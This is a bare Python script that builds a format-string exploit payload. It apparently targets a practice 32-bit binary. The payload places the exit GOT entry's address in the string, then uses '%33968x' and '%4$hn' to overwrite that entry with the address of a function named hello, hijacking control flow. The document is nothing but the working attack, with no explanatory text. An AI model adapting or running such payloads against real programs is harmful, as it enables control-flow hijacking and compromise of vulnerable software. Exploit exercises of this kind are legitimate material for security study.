import struct

hello = struct.pack("I", 0x080484b4)
exit.got = struct.pack("I", 0x08049724)
payload = exit.got
payload += "%33968x"
payload += "%4$hn"
print(payload)
